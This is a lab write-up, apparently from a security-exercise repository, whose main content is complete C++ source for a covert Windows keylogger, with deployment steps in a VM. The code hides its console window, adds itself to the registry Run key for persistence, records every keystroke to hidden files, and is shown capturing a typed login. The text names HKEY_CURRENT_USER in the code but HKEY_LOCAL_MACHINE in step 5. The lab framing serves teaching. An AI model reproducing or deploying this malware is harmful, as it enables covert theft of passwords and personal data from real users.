# Write A Standalone Keylogger
A keylogger is a type of malware used in cyberattacks to steal sensitive information by recording keystrokes on a victim's computer. Often installed covertly through phishing emails, it captures login credentials and personal data for attackers to misuse


## References
- [Keystroke Logging](https://en.wikipedia.org/wiki/Keystroke_logging) by Wikipedia
- [GetAsyncKeyState](https://docs.microsoft.com/en-us/windows/desktop/api/winuser/nf-winuser-getasynckeystate) by Microsoft
- [Keylogger](https://github.com/shubhangi-singh21/Keylogger) by shubhangi-singh21 on GitHub


## Tasks
- Setup a Windows VM
- Write a custom keylogger program with the following capabilities
  - The program starts executing when the system boots
  - The program runs as a background process without affecting any foreground processes
  - The program logs all user keystrokes in hidden files on the same disk
  - The program must use minimal resources to avoid detection
- Keylogger Creation Guidelines
  - You can use Windows APIs in your program
  - Use a programming language of your choice
  - Compile the program into a binary for deployment
- Deploy the keylogger binary in your VM
- Configure the keylogger to execute when the system starts
- Open a web browser and input a fictional username and password into a login form


## Benchmarks
- Validate that your keylogger starts at system boot time
- Validate that your keylogger records all keystrokes in hidden files
- Validate that your keylogger runs as a background process (you can view the active process listing in 'Task Manager')


## Practical Approach
1. Save the following C++ program and compile it into a binary file called `keylogger.exe` to be used in a Windows 10 VM
   ```
    #include <iostream>
    #include <windows.h>
    #include <ctime>      // For timestamp
    #include <sstream>    // For constructing filename
    #include <fstream>    // For file operations
    #include <string>     // For string manipulation
    
    using namespace std;
    
    void AddToStartup() {
        // Get the current executable path using the wide-character version of GetModuleFileName
        wchar_t filePath[MAX_PATH];
        GetModuleFileNameW(NULL, filePath, MAX_PATH);  // Get the path of the current executable
    
        HKEY hKey;
        // Create or open the registry key for startup (HKEY_CURRENT_USER means it will only affect the current user)
        LONG createStatus = RegCreateKeyW(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", &hKey);
    
        if (createStatus == ERROR_SUCCESS) {
            // Set the registry value to add the executable to the startup list
            LONG status = RegSetValueExW(hKey, L"MyKeylogger", 0, REG_SZ, (BYTE*)filePath, (wcslen(filePath) + 1) * sizeof(wchar_t));
            
            if (status == ERROR_SUCCESS) {
                cout << "Keylogger successfully added to startup!" << endl;
            } else {
                cerr << "Error setting registry value!" << endl;
            }
    
            // Close the registry key handle
            RegCloseKey(hKey);
        } else {
            cerr << "Error creating/opening registry key!" << endl;
        }
    }
    
    string CreateDynamicLogFile() {
        // Generate a dynamic file name based on timestamp
        time_t now = time(NULL);
        struct tm* localTime = localtime(&now);
    
        stringstream filename;
        filename << "log_"
                 << localTime->tm_year + 1900 << "_"
                 << (localTime->tm_mon + 1) << "_"
                 << localTime->tm_mday << "_"
                 << localTime->tm_hour << "_"
                 << localTime->tm_min << "_"
                 << localTime->tm_sec << ".txt"; // Second
    
        return filename.str();
    }
    
    void HideLogFile(const string& filename) {
        DWORD attributes = GetFileAttributes(filename.c_str());
        if (attributes == INVALID_FILE_ATTRIBUTES) {
            cerr << "Error getting file attributes for " << filename << endl;
            return;
        }
    
        // Set file attributes to hidden
        if (SetFileAttributes(filename.c_str(), attributes | FILE_ATTRIBUTE_HIDDEN)) {
            cout << "Successfully set file to hidden: " << filename << endl;
        } else {
            cerr << "Failed to set file to hidden: " << filename << endl;
        }
    }
    
    int Save(int _key, const char* file) {
        ofstream OUTPUT_FILE(file, ios::app);
        if (!OUTPUT_FILE.is_open()) {
            cerr << "Error opening file!" << endl;
            return -1;
        }
    
        // Save key inputs to file
        switch (_key) {
            case VK_SHIFT: OUTPUT_FILE << "[SHIFT]"; break;
            case VK_BACK: OUTPUT_FILE << "[BACKSPACE]"; break;
            case VK_LBUTTON: OUTPUT_FILE << "[L_CLICK]"; break;
            case VK_RBUTTON: OUTPUT_FILE << "[R_CLICK]"; break;
            case VK_RETURN: OUTPUT_FILE << "[ENTER]"; break;
            case VK_TAB: OUTPUT_FILE << "[TAB]"; break;
            case VK_ESCAPE: OUTPUT_FILE << "[ESCAPE]"; break;
            case VK_CONTROL: OUTPUT_FILE << "[CTRL]"; break;
            case VK_MENU: OUTPUT_FILE << "[ALT]"; break;
            case VK_CAPITAL: OUTPUT_FILE << "[CAPS LOCK]"; break;
            case VK_SPACE: OUTPUT_FILE << "[SPACE]"; break;
            default: OUTPUT_FILE << (char)_key;
        }
    
        OUTPUT_FILE.close();
        HideLogFile(file);
    
        return 0;
    }
    
    int main() {
        // Hide the console window
        FreeConsole();
    
        // Copy the executable to the Startup folder (ensures persistence)
        AddToStartup(); // Using the updated AddToStartup function
    
        // Create and hide the log file
        string logFilename = CreateDynamicLogFile();
        cout << "Log file created: " << logFilename << endl;
    
        ofstream logFile(logFilename.c_str());
        if (logFile.is_open()) {
            logFile.close();
        } else {
            cerr << "Error creating log file!" << endl;
            return -1;
        }
    
        HideLogFile(logFilename);
    
        char i;
        while (true) {
            Sleep(10); // Reduce CPU usage
            for (i = 8; i <= 255; i++) {
                if (GetAsyncKeyState(i) == -32767) {
                    Save(i, logFilename.c_str()); // Save key presses to the log file
                }
            }
        }
    
        return 0;
    }
   ```
2. Save the following HTML file as `login.html` for the purpose of inputting a fictional username and password in the login form
   ```
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Demo Login Page</title>
    </head>
    <body>
        <h1>Login</h1>
        <form>
            <label for="username">Username:</label><br>
            <input type="text" id="username" name="username"><br><br>
            <label for="password">Password:</label><br>
            <input type="password" id="password" name="password"><br><br>
            <button type="submit">Login</button>
        </form>
    </body>
    </html>
   ```
3. Execute `keylogger.exe` with admin privileges. It will now run as a process in the Task Manager
   ![image](https://github.com/user-attachments/assets/831ccbab-c58a-46ba-b90d-09afd2b7fd5f)

5. Reboot the Windows 10 VM. Since the keylogger executable creates an entry in the registry at `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`, it will autorun at startup
   ![image](https://github.com/user-attachments/assets/9dc68225-187c-4afe-a4d8-dc935422cc7a)
   This can also be found in the Startup tab in Task Manager. Note that multiple registry entries in different registry locations will create multiple startup instances <br/>
   ![image](https://github.com/user-attachments/assets/1a3117e6-17b0-4727-bc1c-583ef2b79968)
   <br/>
   If rebooting the VM does not cause the keylogger to autorun on startup, a manual fix is to press `Win + R` key, and enter `shell:startup`. This will bring you to the folder that stores programs to run on startup. Create a shortcut of `keylogger.exe` and save it here
   ![image](https://github.com/user-attachments/assets/e55bf18f-e6b2-4b26-bbd2-d00a8888b556)
7. Open `login.html` in a web browser. Show that the keylogger records all keystrokes in hidden files
   ![image](https://github.com/user-attachments/assets/265cc2bb-eb34-4b51-b37f-e6c792f2c447)
   ![image](https://github.com/user-attachments/assets/08b3b759-fb9a-4375-b011-94c30f203111)


   
